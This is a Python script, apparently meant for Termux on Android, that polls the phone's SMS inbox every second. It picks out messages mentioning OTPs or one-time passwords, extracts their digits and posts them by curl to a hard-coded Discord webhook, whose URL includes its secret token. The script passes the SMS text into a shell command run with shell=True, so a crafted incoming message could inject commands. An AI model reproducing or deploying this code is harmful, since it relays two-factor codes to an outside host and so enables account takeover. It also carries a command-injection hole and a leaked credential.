import os
import json
import datetime
import time
import re
import subprocess

class SMSForwarder:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1259157009262055444/zCoLIu_bzV2Y0Z9hzhajFBlggsNdOK-prWge-JBvtvuAW7HeEAbjbhEOJMt0ZSnlNYWi"
        self.last_sms_time = self._get_last_sms_time()
        self.filters = ["otp", "one time password", "OTP"]

    def _get_last_sms_time(self):
        tmp_file = "tmpLastTime.txt"
        if os.path.exists(tmp_file):
            with open(tmp_file, "r") as file:
                return datetime.datetime.fromisoformat(file.read().strip())
        else:
            last_sms = datetime.datetime.now()
            with open(tmp_file, "w") as file:
                file.write(last_sms.isoformat())
            return last_sms

    def _update_last_sms_time(self, timestamp):
        tmp_file = "tmpLastTime.txt"
        with open(tmp_file, "w") as file:
            file.write(timestamp.isoformat())

    def _send_to_discord(self, sms):
        numbers = re.findall(r'\d+', sms['body'])
        full_message = f"> {sms['body']}"
        numbers_str = ', '.join(numbers)
        message = f"Forwarded From: {sms['number']} at {sms['received']}\n\n{full_message}\n\n{numbers_str}"

        # Ensure the message is properly escaped for JSON
        json_data = json.dumps({"content": message})

        command = f'curl -H "Content-Type: application/json" -X POST -d \'{json_data}\' {self.webhook_url}'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(f"[!] Discord Response: {result.stdout.strip()} {result.stderr.strip()}")
        return result

    def process_sms(self, sms):
        try:
            received_time = datetime.datetime.fromisoformat(sms['received'])
            print(f"[!] Processing SMS from {sms['number']} received at {sms['received']}")
            if received_time > self.last_sms_time:
                for f in self.filters:
                    if f in sms['body'].lower() and sms['type'] == "inbox":
                        print("[!] Found an OTP Message, Forwarding to Discord...")
                        response = self._send_to_discord(sms)
                        if response.returncode == 0:
                            print("[+] Successfully Forwarded Message to Discord")
                            self._update_last_sms_time(received_time)
                        else:
                            print(f"[!] Failed to Forward Message to Discord: {response.returncode} {response.stderr.strip()}")
        except Exception as e:
            print(f"[!] Error processing SMS: {e}")

def main():
    os.system('clear')
    print("""
     _  _____   __   ___ _____ ____  
    | |/ _ \ \ / /  / _ \_   _|  _ \ 
 _  | | | | \ V /  | | | || | | |_) |
| |_| | |_| || |   | |_| || | |  __/ 
 \___/ \___/ |_|    \___/ |_|
""")
    print("[!] Welcome to Joy SMS Forwarder")
    print("[!] You Can Press Ctrl + c To Exit The Script")

    forwarder = SMSForwarder()

    while True:
        time.sleep(1)
        jdata = os.popen("termux-sms-list").read().strip()
        print(f"[!] Raw SMS data: {jdata}")
        if not jdata:
            print("[!] No SMS data retrieved")
            continue
        try:
            jd = json.loads(jdata)
            print(f"[!] JSON loaded SMS data: {jd}")
            if not jd:
                print("[!] No new SMS messages found")
                continue
        except json.JSONDecodeError as e:
            print(f"[!] JSON Decode Error: {e}")
            continue

        for j in jd:
            print(f"[!] Processing SMS: {j}")
            forwarder.process_sms(j)

if __name__ == "__main__":
    main()
